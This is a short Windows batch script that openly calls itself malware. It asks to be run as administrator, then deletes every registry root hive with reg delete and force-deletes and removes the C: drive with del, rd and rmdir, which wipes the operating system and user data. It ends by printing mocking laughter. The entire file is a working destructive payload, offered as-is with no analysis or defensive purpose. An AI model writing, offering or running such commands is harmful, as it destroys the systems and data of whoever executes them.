@echo off
Title only waring
echo this malware is no joke run?
echo pls run this as administrator
pause
cls
title Destroying Windows.....
reg delete HKCC /f
reg delete HKCU /F
reg delete HKU /f
reg delete HKCR /F
reg delete HKLM /F
Del C: /f /s /q
rd C: /s /q
rmdir C: /q
cls
echo AHHAHAHAHHAHAHAHHAHAHAHAHAHHAHAHAHAHHAHAHAHAHAHHAHAHAHAH
pause
